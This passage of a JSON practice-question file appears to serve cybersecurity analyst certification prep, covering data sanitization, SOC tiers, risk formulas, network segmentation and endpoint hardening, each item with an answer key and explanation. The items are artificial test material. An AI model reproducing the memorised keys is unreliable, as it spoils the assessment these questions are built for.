Owner.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-objectives:5","set":"lq","ch":1,"d":1,"q":"An organization is retiring older magnetic hard drives containing sensitive customer records before donating server hardware. According to NIST SP 800-88, which sanitization action represents physical destruction to guarantee that data cannot be recovered even using laboratory forensic techniques?","o":["Overwriting all addressable storage locations with a fixed binary pattern using a three-pass DoD wipe","Degaussing the magnetic media followed by mechanical shredding or disintegration","Cryptographic erasure of disk encryption keys followed by high-level operating system reformatting","Executing an ATA Secure Erase firmware command to purge magnetic recording sectors"],"a":1,"e":"Degaussing disrupts magnetic domains on platters, and physical shredding completely disintegrates the physical drive, fulfilling the NIST SP 800-88 'Destroy' standard. Overwriting and ATA Secure Erase fall under 'Clear' or 'Purge' rather than physical destruction, and cryptographic erasure (Purge) leaves the physical storage media intact.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-objectives:6","set":"lq","ch":1,"d":1,"q":"An analyst is reviewing compliance requirements for an application storing patient diagnostic lab results. Which regulation and data category pair is the primary driver for these controls?","o":["PCI DSS governing Cardholder Data (CHD)","HIPAA governing Protected Health Information (PHI)","FERPA governing Student Educational Records","GLBA governing Nonpublic Personal Information (NPI)"],"a":1,"e":"HIPAA (Health Insurance Portability and Accountability Act) specifically governs Protected Health Information (PHI), which includes patient diagnostic and medical records. PCI DSS governs payment card data, FERPA governs educational records, and GLBA governs financial institution customer records.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-objectives:7","set":"lq","ch":1,"d":1,"q":"A security engineer configures an enterprise Data Loss Prevention (DLP) solution to monitor outbound email attachments. A user attempts to email an internal budget spreadsheet labeled 'Confidential' to a personal webmail address. Which mechanism allows the DLP agent to detect and block this transmission?","o":["Scanning the attachment with heuristic analysis to detect weaponized macro payloads","Querying an external threat intelligence feed to assess the recipient domain's reputation score","Inspecting the file's classification metadata tag and enforcing an outbound egress policy rule","Intercepting the outbound TLS handshake and requiring mutual certificate authentication"],"a":2,"e":"Enterprise DLP systems inspect classification labels, document properties, and metadata tags embedded in files. When a file labeled 'Confidential' violates egress policy (such as emailing to an external personal webmail address), the agent blocks the transfer. Macro heuristics detect malware rather than sensitive data, and threat intelligence or TLS checks evaluate connection safety rather than content sensitivity.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-objectives:8","set":"lq","ch":1,"d":1,"q":"An analyst working on a federal defense system reviews information whose unauthorized disclosure is reasonably expected to cause 'exceptionally grave damage' to national security. What is the official government classification level for this data?","o":["Confidential","Secret","Unclassified","Top Secret"],"a":3,"e":"Under US government classification standards, Top Secret applies to information where unauthorized disclosure could cause 'exceptionally grave damage.' Secret applies to 'serious damage,' and Confidential applies to 'identifiable damage.' Unclassified is data that does not require national security controls.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-objectives:9","set":"lq","ch":1,"d":1,"q":"A multinational corporation classifies customer contact lists as 'Internal Use Only.' What does this classification level typically signify in commercial environments?","o":["The information can be viewed by authorized company personnel for routine business operations but must not be disclosed publicly.","The information is approved for unrestricted external distribution across public marketing and press channels.","The information represents highly confidential trade secrets restricted strictly to executive leadership and legal teams.","The information is classified as regulated credit card data requiring dedicated tokenization and HSM storage."],"a":0,"e":"In commercial data classification schemes, 'Internal Use Only' designates standard business information that employees may view to perform their duties but which should not be released to external parties. Public information is unrestricted, Confidential/Restricted is reserved for highly sensitive trade secrets or executive data, and payment data falls under specialized regulatory schemes like PCI DSS.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-objectives:10","set":"lq","ch":1,"d":1,"q":"A consumer e-commerce platform collects customer phone numbers solely for two-factor authentication verification. Two years after an account is closed, the company continues to retain the phone number and begins using it for telemarketing promotions. Which PMF objective is being VIOLATED?","o":["Data integrity and quality","Use, retention, and disposal","Monitoring and enforcement","Management"],"a":1,"e":"The PMF 'Use, retention, and disposal' objective requires that organizations only use personal information for the specific purposes identified in their notice and consented to by the individual, and securely dispose of it when no longer needed. Repurposing MFA numbers for marketing and retaining them indefinitely violates this requirement.","l":"c1-objectives","l2":"","k":""},{"id":"lq:c1-soc:1","set":"lq","ch":1,"d":1,"q":"A mid-sized healthcare enterprise wants 24/7 security monitoring but cannot afford to hire and retain an in-house night shift of Tier 1 analysts. However, the organization's legal policies require all sensitive incident investigations and containment actions to be conducted exclusively by internal staff. Which SOC operating model BEST satisfies these requirements?","o":["Hybrid SOC","Managed SOC (MSSP)","Internal SOC","Virtual SOC"],"a":0,"e":"A Hybrid SOC model combines internal staff with an external Managed Security Service Provider (MSSP). The MSSP provides cost-effective 24/7 Tier 1 triage and overnight monitoring, while the internal security team retains full control over sensitive incident investigations, containment, and eradication. An Internal SOC (Option C) is cost-prohibitive for 24/7 staffing. A fully Managed SOC (Option B) delegates sensitive investigations to third parties. Virtual SOC (Option D) refers to distributed analysts without a physical facility.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-soc:2","set":"lq","ch":1,"d":1,"q":"A SOC team is experiencing significant alert fatigue due to thousands of daily phishing notifications requiring manual IP and URL reputation lookups. Which technology should the SOC manager implement to automate these repetitive enrichment and ticketing actions?","o":["Security Information and Event Management (SIEM)","Security Orchestration, Automation, and Response (SOAR)","Intrusion Detection System (IDS)","Extended Detection and Response (XDR)"],"a":1,"e":"SOAR platforms automate repetitive, predictable response tasks such as threat enrichment (querying VirusTotal or AbuseIPDB) and opening incident tickets via automated runbooks. SIEM (Option A) centralizes log ingestion and correlation rules, but SOAR executes automated response workflows. IDS (Option C) detects intrusions. XDR (Option D) unifies telemetry across endpoints and network.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-soc:3","set":"lq","ch":1,"d":1,"q":"An analyst is reviewing quarterly performance metrics. The metric measuring the duration from when an adversary first establishes persistence on a network until the activity is flagged by the security team has increased from 4 hours to 18 hours. Which metric has degraded?","o":["Mean Time to Remediate","Mean Time to Respond (MTTR)","Mean Time to Detect (MTTD)","Mean Time Between Failures (MTBF)"],"a":2,"e":"Mean Time to Detect (MTTD) measures the time elapsed between initial compromise/threat activity and the moment security systems or analysts detect it. Mean Time to Respond (MTTR, Option B) measures time from detection to initial response/containment. Mean Time to Remediate (Option A) measures time to fully eradicate and restore systems.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-soc:4","set":"lq","ch":1,"d":1,"q":"A junior analyst receives an alert indicating a possible brute-force attempt against a web server. The analyst confirms multiple failed login attempts followed by a successful login from an unexpected foreign IP, opens a case in the ticketing system, flags the incident as High priority, and assigns it to the investigation queue according to SOP. Which analyst tier performed this action?","o":["Threat Intelligence Analyst","Tier 2 Analyst","Tier 3 Analyst","Tier 1 Analyst"],"a":3,"e":"Tier 1 analysts handle high-volume triage, classify alerts as true or false positives, assign severity, and escalate valid incidents to Tier 2. Tier 2 performs multi-source correlation and deep investigation. Tier 3 performs proactive threat hunting. Threat Intelligence analysts track adversary groups.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-soc:5","set":"lq","ch":1,"d":1,"q":"Attackers breached an organization by issuing unauthorized API calls against an Amazon Web Services (AWS) management console using compromised administrative credentials. The on-premises SIEM and host-based EDR failed to detect the breach because cloud audit logging was unmonitored. Which continuous monitoring data category was missing?","o":["Cloud telemetry","Network telemetry","Endpoint telemetry","Application telemetry"],"a":0,"e":"Cloud telemetry (such as AWS CloudTrail, Azure Audit Logs, and Google Cloud Audit Logs) records control plane API activity and administrative management events. On-premises SIEM and host EDR do not monitor cloud management APIs unless cloud log sources are explicitly ingested.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-soc:6","set":"lq","ch":1,"d":1,"q":"An incoming morning shift analyst discovers that a critical ransomware alert escalated overnight and encrypted three database servers. The outgoing night analyst had begun isolating hosts but had only briefed the incoming lead verbally in the hallway, omitting the active compromised hostnames from the ticketing system. What was the ROOT CAUSE of this incident escalation?","o":["A failure of the endpoint detection and response (EDR) isolation mechanism","A procedural handover documentation failure in the case management platform","An architectural failure to implement out-of-band communication channels","A lack of an automated threat intelligence feed in the SIEM platform"],"a":1,"e":"The root cause was a shift handover failure: documentation must always be recorded in the ticketing platform as the single source of truth, with verbal briefings serving only as a supplement. Relying on verbal communication alone created a single point of failure that delayed containment. EDR (Option A) was not cited as failing, and out-of-band comms (Option C) applies when infrastructure is compromised.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-soc:7","set":"lq","ch":1,"d":1,"q":"According to standard SOC procedures, which three components MUST be included in a formal written shift handover document?","o":["Incident escalation matrix, operational playbooks, and log retention schedules","Threat hunt hypotheses, quarterly vulnerability scan reports, and baseline network maps","Shift summary, active case status, and watch items list","Chain of custody logs, legal hold notices, and forensic disk image registries"],"a":2,"e":"A complete SOC shift handover document comprises three operational sections: 1. Shift summary (high-level activity metrics and alert volumes), 2. Active case status (open investigations, current containment states, and pending analyst tasks), and 3. Watch items list (emerging suspicious indicators or unconfirmed anomalies requiring observation). Option A lists static governance documentation rather than operational shift status. Option B describes strategic threat hunting and vulnerability planning. Option D lists evidence management records that belong to specific forensic cases rather than routine shift handovers.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-soc:8","set":"lq","ch":1,"d":1,"q":"A SOC team is drowning in false positive alerts generated by a newly deployed vulnerability scanner conducting scheduled nighttime assessments. Analysts are experiencing severe alert fatigue. What is the BEST process improvement action to resolve this issue?","o":["Hire additional Tier 1 analysts to handle the increased alert volume during the night shift.","Configure dynamic SIEM thresholding to automatically suppress all high-volume network spikes.","Reclassify the scanner IP address as an external untrusted entity to open automated threat hunt tickets.","Tune detection rules by whitelisting the vulnerability scanner IP address during scheduled scan windows."],"a":3,"e":"When legitimate administrative tools generate excessive noise, the proper resolution is alert tuning: specifically whitelisting the known scanner IP address or creating time-based exclusion rules during scheduled maintenance windows. Option B is tempting because thresholding reduces alert counts, but suppressing high-volume traffic broadly blinds analysts to genuine network floods and brute-force attacks. Option A is an inefficient administrative measure that wastes analyst capacity on predictable noise. Option C worsens alert fatigue by generating more spurious investigations.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-soc:9","set":"lq","ch":1,"d":1,"q":"An organization wants to ensure incident handling consistency across all shifts while automating initial containment. Which statement ACCURATELY contrasts a playbook with a runbook?","o":["A playbook is a human-readable procedural guide for analysts, whereas a runbook is an automated workflow executed in a SOAR tool.","A playbook is an automated orchestration workflow in a SOAR platform, whereas a runbook is a high-level strategic governance policy.","A playbook defines regulatory notification criteria under GDPR and HIPAA, whereas a runbook dictates technical network isolation steps.","A playbook is an operational service-level agreement between SOC tiers, whereas a runbook is a vendor-neutral disaster recovery manual."],"a":0,"e":"A playbook is a human-readable, step-by-step procedure guiding analysts through an incident response process (e.g., phishing triage or ransomware response). A runbook is the automated implementation of those steps executed within a SOAR platform. Option B is the classic inversion trap: candidates often confuse which artifact is human-facing and which is machine-executed. Option C incorrectly limits playbooks to legal compliance, and Option D confuses operational playbooks with contractual SLAs.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-soc:10","set":"lq","ch":1,"d":1,"q":"During an active breach investigation involving a compromised Microsoft 365 tenant, the SOC team suspects that adversary actors are monitoring internal email and Teams messaging channels. How should the SOC team coordinate the incident handover and operational response?","o":["Use internal corporate email marked with High Importance and confidential retention flags.","Switch all incident communication to an out-of-band secure channel.","Post all incident status briefings and containment commands to an internal restricted SharePoint site.","Encrypt all internal communications using native Microsoft 365 message encryption certificates."],"a":1,"e":"When internal communication infrastructure (such as corporate email, Teams, or collaboration sites) is suspected of adversary compromise, analysts must immediately switch to out-of-band communication (such as external encrypted messaging apps, dedicated non-domain hardware, or secure phone bridges) to avoid tipping off the adversary. Option D is tempting because encryption provides message confidentiality against network eavesdroppers, but if the M365 tenant or tenant administrative accounts are compromised, adversaries can inspect encrypted tenant traffic directly. Options A and C utilize the compromised infrastructure.","l":"c1-soc","l2":"","k":""},{"id":"lq:c1-risk:1","set":"lq","ch":1,"d":1,"q":"An enterprise datacenter houses a database server with an Asset Value (AV) of $500,000. A risk analyst calculates that a successful ransomware attack would cause an Exposure Factor (EF) of 40%. Threat intelligence indicates an Annualized Rate of Occurrence (ARO) of 0.2 for this type of attack. What is the Annualized Loss Expectancy (ALE)?","o":["$40,000","$20,000","$100,000","$200,000"],"a":0,"e":"First calculate the Single Loss Expectancy (SLE): SLE = Asset Value x Exposure Factor = $500,000 x 0.40 = $200,000. Next calculate the Annualized Loss Expectancy (ALE): ALE = SLE x ARO = $200,000 x 0.2 = $40,000. Option B ($20,000) incorrectly multiplies by 0.1. Option C ($100,000) is half the SLE. Option D ($200,000) is the SLE before multiplying by the ARO.","l":"c1-risk","l2":"","k":""},{"id":"lq:c1-risk:2","set":"lq","ch":1,"d":1,"q":"An organization deploys next-generation firewalls, endpoint detection and response (EDR), and multi-factor authentication (MFA). Despite these robust safeguards, the security manager explains to executive leadership that some risk of a security incident still exists. What term describes this remaining level of risk?","o":["Inherent risk","Residual risk","Accepted risk","Transferred risk"],"a":1,"e":"Residual risk is the risk that remains after security controls and countermeasures have been implemented. Inherent risk (Option A) is the raw risk level before any controls are applied. Accepted risk (Option C) refers specifically to the subset of risk leadership has formally chosen not to mitigate. Transferred risk (Option D) is risk shifted to third parties.","l":"c1-risk","l2":"","k":""},{"id":"lq:c1-risk:3","set":"lq","ch":1,"d":1,"q":"Executive leadership determines as a strategic objective that the company will tolerate no downtime for its public transaction engine, but allows for minor temporary latency spikes of up to 10 seconds during peak traffic hours. Which concepts describe the overall strategic stance and the allowable variance, respectively?","o":["Risk tolerance and Risk avoidance","Inherent risk and Residual risk","Risk appetite and Risk tolerance","Risk transference and Risk acceptance"],"a":2,"e":"Risk appetite is the high-level, strategic decision by executive leadership regarding how much risk the organization is willing to pursue or accept. Risk tolerance is the acceptable operational variation or buffer around that appetite (in this case, minor latency spikes). Inherent and residual risk (Option B) measure risk before and after controls.","l":"c1-risk","l2":"","k":""},{"id":"lq:c1-risk:4","set":"lq","ch":1,"d":1,"q":"A company assesses that a massive data breach could result in millions of dollars in regulatory fines and legal liabilities. To protect against this financial consequence without altering its underlying cloud applications, the company purchases a comprehensive cyber liability insurance policy. Which risk management strategy was implemented?","o":["Risk mitigation","Risk avoidance","Risk acceptance","Risk transference"],"a":3,"e":"Risk transference shifts the financial impact of a risk to a third party, typically via insurance policies, warranties, or outsourced contracts. Transference does not eliminate the vulnerability or stop attacks. Risk mitigation (Option A) uses technical controls. Avoidance (Option B) stops the activity. Acceptance (Option C) retains the financial risk internally.","l":"c1-risk","l2":"","k":""},{"id":"lq:c1-risk:5","set":"lq","ch":1,"d":1,"q":"During an active malware outbreak, a SOC analyst uses the EDR console to disconnect an infected workstation from the local network and uses Active Directory to disable the compromised user account. How should these security controls be classified by FUNCTION?","o":["Responsive","Detective","Preventative","Corrective"],"a":0,"e":"Responsive controls are active countermeasures taken during an incident to contain damage and isolate compromised entities (e.g., host isolation, account disabling, firewall blocking). Preventative controls (Option C) stop attacks beforehand. Detective controls (Option B) observe and alert. Corrective controls (Option D) restore operations and rebuild systems after containment.","l":"c1-risk","l2":"","k":""},{"id":"lq:c1-risk:6","set":"lq","ch":1,"d":1,"q":"An enterprise mandates that all new employees complete an online security awareness training module via a cloud-based learning management system. How should this control be classified by TYPE?","o":["Technical control","Administrative control","Physical control","Compensating control"],"a":1,"e":"Controls are classified by their fundamental nature and purpose, not their delivery mechanism. Security awareness training aims to change human behavior and enforce corporate policies, making it an Administrative (or managerial) control, even though it is delivered digitally. Technical controls (Option A) are software/hardware safeguards like firewalls. Physical controls (Option C) protect tangible assets.","l":"c1-risk","l2":"","k":""},{"id":"lq:c1-risk:7","set":"lq","ch":1,"d":1,"q":"An analyst is evaluating network security appliances. Which device functions as a DETECTIVE control rather than a PREVENTATIVE control?","o":["Web Application Firewall (WAF) blocking SQL injection attempts","Network Access Control (NAC) quarantining non-compliant laptops","Intrusion Detection System (IDS) logging suspicious port scans","Multi-Factor Authentication (MFA) denying access without an OTP"],"a":2,"e":"An Intrusion Detection System (IDS) observes network traffic and generates alerts upon detecting suspicious patterns, but it does not actively block traffic, making it a Detective control. A WAF (Option A), NAC (Option C), and MFA (Option D) actively intercept and block unauthorized actions, classifying them as Preventative controls.","l":"c1-risk","l2":"","k":""},{"id":"lq:c1-risk:8","set":"lq","ch":1,"d":1,"q":"According to NIST SP 800-30, what three components must be present simultaneously for a cybersecurity risk to exist?","o":["A known threat actor, an unpatched zero-day exploit, and an active outbound command-and-control session","A high CVSS base score, an unsegmented network subnet, and an absence of endpoint detection agents","An exploited vulnerability, an unauthenticated user session, and an unlogged administrative action","A threat source, an exploitable vulnerability, and a potential adverse organizational impact"],"a":3,"e":"NIST SP 800-30 defines risk as a function of the likelihood of a threat source exercising a potential vulnerability and the resulting adverse impact on organizational operations or assets. If a vulnerability exists without a viable threat, or if a threat cannot produce adverse impact, risk is not present. The other options describe specific operational attack scenarios rather than the fundamental components of risk.","l":"c1-risk","l2":"","k":""},{"id":"lq:c1-risk:9","set":"lq","ch":1,"d":1,"q":"A business unit requires the temporary use of a legacy server running an unsupported operating system that cannot be patched. What is required before the security team can permit this operational exception?","o":["Documenting an approved risk exception with compensating controls, designated executive sign-off, and a defined review expiration date.","Reclassifying the server as an isolated test asset in the asset inventory to permanently remove it from compliance auditing.","Deploying an automated vulnerability exception rule in the scanner to suppress all future alerts indefinitely.","Procuring a targeted cyber insurance endorsement to transfer all technical maintenance responsibilities to the carrier."],"a":0,"e":"A formal risk exception requires documented business justification, implementation of robust compensating controls (such as strict network isolation), formal sign-off from designated senior leadership (such as the CISO), and a mandatory re-evaluation date. Suppressing alerts or manipulating asset inventories bypasses governance and creates unmonitored risk, and cyber insurance transfers financial loss rather than operational maintenance.","l":"c1-risk","l2":"","k":""},{"id":"lq:c1-network:1","set":"lq","ch":1,"d":1,"q":"A security analyst deploys a fake administrative service account credential into memory on an internal server to detect credential dumping. Two days later, the SIEM alerts that the fake credential was submitted in a Kerberos Authentication Service Ticket (TGT) request. Which Windows Security Event ID confirmed the usage of this honeytoken?","o":["Event ID 4768","Event ID 4688","Event ID 4624","Event ID 7045"],"a":0,"e":"Windows Security Event ID 4768 records Kerberos Ticket Granting Ticket (TGT) requests. When an adversary attempts to use a honeytoken Kerberos account, Event ID 4768 provides immediate, high-confidence evidence of lateral movement. Event ID 4624 logs successful logons. Event ID 4688 logs process creation. Event ID 7045 logs new service installations.","l":"c1-network","l2":"","k":""},{"id":"lq:c1-network:2","set":"lq","ch":1,"d":1,"q":"A threat research team needs to observe the specific privilege escalation scripts and lateral movement post-exploitation tools used by an advanced threat actor. Which type of deception deployment BEST supports this objective while managing operational risk?","o":["Low-interaction honeypot exposed directly on a production subnet","High-interaction honeypot isolated on a dedicated, strictly segmented network","DNS sinkhole configured on the primary corporate domain controller","Captive portal NAC redirecting unknown MAC addresses"],"a":1,"e":"A high-interaction honeypot runs real operating systems and applications, allowing adversaries to interact deeply and deploy actual exploits and post-exploitation tools, providing rich TTP intelligence. Because it runs real code, it carries high risk and must be strictly isolated from production. Low-interaction honeypots (Option A) only simulate banners. DNS sinkholes (Option C) remediate malware C2.","l":"c1-network","l2":"","k":""},{"id":"lq:c1-network:3","set":"lq","ch":1,"d":1,"q":"A SOC analyst confirms that an employee laptop is actively beaconing to a known ransomware command-and-control server. The analyst needs to prevent lateral movement while preserving evidence for forensic analysis. What is the BEST immediate action?","o":["Power off the laptop immediately by holding down the physical power button.","Configure an edge perimeter firewall rule to block the external C2 IP address.","Initiate endpoint network isolation via the EDR console.","Trigger a remote hard reboot using administrative PowerShell commands."],"a":2,"e":"Endpoint network isolation via EDR severs all inbound and outbound network communications to and from the host while preserving the management channel, allowing analysts to perform remote live forensics and dump memory without lateral movement. Option B is tempting because it halts external C2 communications, but it leaves internal network interfaces unconstrained, allowing worm-like ransomware to spread laterally across the local subnet. Options A and D destroy volatile RAM evidence.","l":"c1-network","l2":"","k":""},{"id":"lq:c1-network:4","set":"lq","ch":1,"d":1,"q":"An enterprise is establishing connectivity between its on-premises data center and its AWS cloud infrastructure. The workload handles high-volume, latency-sensitive database replication that must not traverse the public internet. Which connectivity option is the BEST choice?","o":["Site-to-site IPsec VPN over public internet","VPC peering connection routed across public transit gateways","Client-to-site SSL/TLS VPN gateway","Dedicated private connection such as AWS Direct Connect"],"a":3,"e":"AWS Direct Connect (or Azure ExpressRoute) provides dedicated, private physical network circuits that bypass the public internet entirely, delivering predictable latency, high throughput, and enhanced security for sensitive database replication. Option A is tempting because IPsec encrypts traffic, but it routes across the unpredictable public internet, introducing latency spikes and throughput jitter. Option B uses public transit routing, and Option C is designed for individual remote worker access rather than high-volume data center interconnects.","l":"c1-network","l2":"","k":""},{"id":"lq:c1-network:5","set":"lq","ch":1,"d":1,"q":"An analyst inspecting network flow logs notices that an internal endpoint is sending hundreds of DNS queries per minute to a single domain. Each query requests a subdomain consisting of a long string of random alphanumeric characters (e.g., a7f9x21b.evilcorp.com). What network threat does this pattern MOST likely represent?","o":["DNS tunneling and data exfiltration","ARP spoofing attack","Denial of Service against internal DNS","Rogue DHCP server spoofing"],"a":0,"e":"DNS tunneling encodes data or C2 commands into DNS queries and responses using unusually long, randomized subdomain strings. Because DNS (port 53) is often permitted outbound without deep inspection, attackers exploit it to bypass egress controls. ARP spoofing (Option B) is a Layer 2 local attack. DoS (Option C) aims to overwhelm capacity.","l":"c1-network","l2":"","k":""},{"id":"lq:c1-network:6","set":"lq","ch":1,"d":1,"q":"In an 802.1X Network Access Control implementation, which component resides directly on the network switch or wireless access point and relays access credentials to the RADIUS server?","o":["Supplicant","Authenticator","Authentication Server","Certificate Authority"],"a":1,"e":"In 802.1X, the network switch or wireless AP acts as the Authenticator. The device seeking admission runs the Supplicant software, and the back-end RADIUS or TACACS+ server serves as the Authentication Server. The authenticator relays authentication messages between the supplicant and the authentication server.","l":"c1-network","l2":"","k":""},{"id":"lq:c1-network:7","set":"lq","ch":1,"d":1,"q":"Which statement ACCURATELY distinguishes network segmentation from network isolation?","o":["Segmentation is a reactive incident containment action; isolation is an architectural design.","Segmentation relies exclusively on physical cabling; isolation is strictly implemented through software-defined proxies.","Segmentation is an architectural design that partitions networks into trust zones; isolation is a reactive containment action that cuts a host from network communication.","Segmentation applies only to cloud environments; isolation applies only to on-premises hardware."],"a":2,"e":"Segmentation is a preventive architectural control dividing a network into distinct security zones (via VLANs, firewalls, and subnets) to restrict lateral movement. Isolation is an active, reactive incident response measure used to quarantine a specific compromised host from all network traffic during an ongoing attack.","l":"c1-network","l2":"","k":""},{"id":"lq:c1-network:8","set":"lq","ch":1,"d":1,"q":"Modern security architecture emphasizes identity and micro-segmentation over perimeter firewalls. Which set of factors has MOST contributed to this shift, known as deperimeterization?","o":["Adoption of software-defined WAN (SD-WAN) overlays and retirement of BGP routing","Transition from stateful inspection firewalls to containerized proxy microservices","Consolidation of on-premises datacenters into regional co-location facilities","Widespread cloud adoption, remote work, mobile devices, and third-party vendor access"],"a":3,"e":"Deperimeterization is driven by enterprise cloud migration (SaaS/IaaS), remote and hybrid workforces, mobile device proliferation (BYOD), and third-party vendor integrations. These factors dissolve the traditional physical network perimeter, requiring identity, least privilege, and micro-segmentation to serve as the new security boundary. Option B is tempting because modern networks utilize proxies and microservices, but technology form-factors alone did not drive the dissolution of perimeter trust; user mobility and cloud-hosted data did. Options A and C describe network routing and infrastructure consolidation trends that preserve traditional boundary models.","l":"c1-network","l2":"","k":""},{"id":"lq:c1-endpoint-pentest:1","set":"lq","ch":1,"d":1,"q":"A company allows employees to access corporate email and proprietary web apps from their personal smartphones. To prevent corporate data loss while respecting employee privacy and avoiding managing personal apps or photos, which mobile device strategy is the BEST choice?","o":["Mobile Application Management (MAM) with containerized corporate app policies","Mobile Device Management (MDM) with remote full-device wipe","Unified Endpoint Management (UEM) enforcing kernel-level device encryption","Installing EDR behavioral sensors on personal smartphones"],"a":0,"e":"Mobile Application Management (MAM) controls and protects corporate applications and sensitive data without taking management control of the entire personal device, making it ideal for BYOD. MDM (Option B) and UEM (Option C) manage the entire hardware device, allowing full wipe of personal photos and data. EDR agents (Option D) are rarely supported on personal smartphones.","l":"c1-endpoint-pentest","l2":"","k":""},{"id":"lq:c1-endpoint-pentest:2","set":"lq","ch":1,"d":1,"q":"A security engineer is designing an application allowlisting policy for high-value financial endpoints running Windows 11. Which mechanism provides the STRONGEST protection against unauthorized executable bypass because it is enforced at the operating system kernel level?","o":["AppLocker path-based rules","Windows Defender Application Control (WDAC)","Software Restriction Policies (SRP)","Group Policy Object (GPO) registry restrictions"],"a":1,"e":"Windows Defender Application Control (WDAC) is enforced at the Windows kernel level, making it significantly more robust and resistant to administrative user-mode bypasses than AppLocker. AppLocker (Option A) operates primarily in user mode. SRP (Option C) is deprecated.","l":"c1-endpoint-pentest","l2":"","k":""},{"id":"lq:c1-endpoint-pentest:3","set":"lq","ch":1,"d":1,"q":"During a security incident investigation, an analyst notices that a compromised domain server suddenly ceased generating Windows Security Event ID 4688 logs at 02:15 AM, despite active network connections persisting. What does this abrupt cessation MOST likely indicate?","o":["The central SIEM reached ingestion capacity and initiated network backpressure on event forwarders.","The Volume Shadow Copy service automatically purged historical event log archives during a snapshot.","The adversary altered the local audit policy to disable process creation auditing as an anti-forensic evasion technique.","An automated operating system maintenance script rotated the event log file and restarted the EventLog service."],"a":2,"e":"Event ID 4688 tracks process creation. Sophisticated adversaries who gain administrative privileges frequently modify audit policies (via auditpol.exe or GPO manipulation) to blind defenders to subsequent tool executions. While log service crashes or storage rotation can interrupt logging, an abrupt targeted cessation during active unauthorized connections strongly indicates adversary anti-forensic tampering.","l":"c1-endpoint-pentest","l2":"","k":""},{"id":"lq:c1-endpoint-pentest:4","set":"lq","ch":1,"d":1,"q":"A vulnerability scanner identifies a critical remote code execution flaw in an internal web server. Before notifying the system owner, an analyst wants to confirm whether the finding is a true positive or a scanner false positive without launching a destructive payload. Which Metasploit Framework module type should the analyst use?","o":["Exploit module","Post-exploitation module","Payload module","Auxiliary module"],"a":3,"e":"Metasploit Auxiliary modules perform scanning, information gathering, and vulnerability validation without executing an intrusive payload or compromising system stability. Exploit modules (Option A) execute attacks. Payload modules (Option C) provide interactive shells (like Meterpreter). Post-exploitation modules (Option B) execute actions after compromise.","l":"c1-endpoint-pentest","l2":"","k":""},{"id":"lq:c1-endpoint-pentest:5","set":"lq","ch":1,"d":1,"q":"An organization schedules a security exercise where offensive operators execute MITRE ATT&CK techniques one by one while SOC analysts observe detection consoles simultaneously. When a technique goes undetected, both teams immediately pause to review logs, adjust detection queries, and re-test. Which type of exercise is being conducted?","o":["Purple team exercise","Blue team audit","Red team exercise","White team review"],"a":0,"e":"A Purple Team exercise is characterized by real-time, side-by-side collaboration between offensive (red) and defensive (blue) operators. Rather than comparing notes after an engagement, purple teams immediately analyze detection gaps and tune rules on the spot. Red team exercises (Option C) are adversarial and silent.","l":"c1-endpoint-pentest","l2":"","k":""},{"id":"lq:c1-endpoint-pentest:6","set":"lq","ch":1,"d":1,"q":"A zero-day vulnerability with public proof-of-concept exploit code is actively being exploited in the wild against the organization's public-facing VPN appliances. The standard enterprise monthly patching cycle is three weeks away. What should the security team do?","o":["Wait for the scheduled monthly maintenance window to ensure thorough operational testing across business units.","Invoke the emergency change management process to test and deploy the out-of-band vendor patch immediately.","Implement temporary IP geolocation blocks on perimeter firewalls and defer patching until the standard release cycle.","Submit a formal risk acceptance request to leadership and monitor external gateway traffic for anomalies."],"a":1,"e":"When an internet-facing device faces active exploitation in the wild, the organization must invoke an emergency change process to expedite testing and deployment of the out-of-band security patch. Deferring the update for three weeks or relying solely on geolocation filtering leaves the organization exposed to breach, as adversaries routinely route attacks through domestic proxies.","l":"c1-endpoint-pentest","l2":"","k":""},{"id":"lq:c1-endpoint-pentest:7","set":"lq","ch":1,"d":1,"q":"A threat hunter discovers the Microsoft Sysinternals utility procdump.exe executing from C:\\Users\\Public\\Downloads\\ with command arguments targeting lsass.exe. How should the analyst interpret this finding?","o":["Benign administrative memory profiling of Windows operating system components.","An automated diagnostic dump initiated by Microsoft Defender Antivirus.","Malicious execution of a dual-use tool attempting to dump plaintext credentials from LSASS memory.","A routine memory cleanup routine triggered by Windows Task Scheduler."],"a":2,"e":"ProcDump is a legitimate Microsoft Sysinternals debugging tool, making it a dual-use utility. Attackers frequently drop it into world-writable directories (like C:\\Users\\Public\\) and execute it against lsass.exe to harvest cached Kerberos tickets, NTLM hashes, and credentials from Local Security Authority Subsystem Service memory.","l":"c1-endpoint-pentest","l2":"","k":""},{"id":"lq:c1-endpoint-pentest:8","set":"lq","ch":1,"d":1,"q":"An analyst identifies an unknown script executing on an endpoint. To assess whether the activity is malicious, the analyst evaluates where the script was located on disk, which user account executed it, what function it performs, and the time of day it ran. Which evaluation framework is the analyst applying?","o":["STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)","DREAD (Damage, Reproducibility, Exploitability, Affected Users, Discoverability)","PASTA (Process for Attack Simulation and Threat Analysis)","L-I-P-T (Location, Identity, Purpose, Timing)"],"a":3,"e":"L-I-P-T is a practical operational mnemonic for evaluating suspicious software or dual-use tool activity by assessing Location (file path), Identity (user account), Purpose (behavior or command-line arguments), and Timing (schedule relative to normal work hours). STRIDE, DREAD, and PASTA are threat modeling and vulnerability rating methodologies used during architecture design rather than live endpoint script triage.","l":"c1-endpoint-pentest","l2":"","k":""},{"id":"lq:c1-endpoint-pentest:9","set":"lq","ch":1,"d":1,"q":"An enterprise system administrator is hardening a fleet of standard employee laptops using CIS Benchmarks. Which profile should the administrator implement to establish a strong security baseline while ensuring minimal negative impact on routine business applications?","o":["CIS Benchmark Level 1 Profile","CIS Benchmark Level 2 Profile","DISA STIG Category 1 Mandate","NSA Mandatory Access Control Policy"],"a":0,"e":"CIS Benchmark Level 1 profiles are designed to 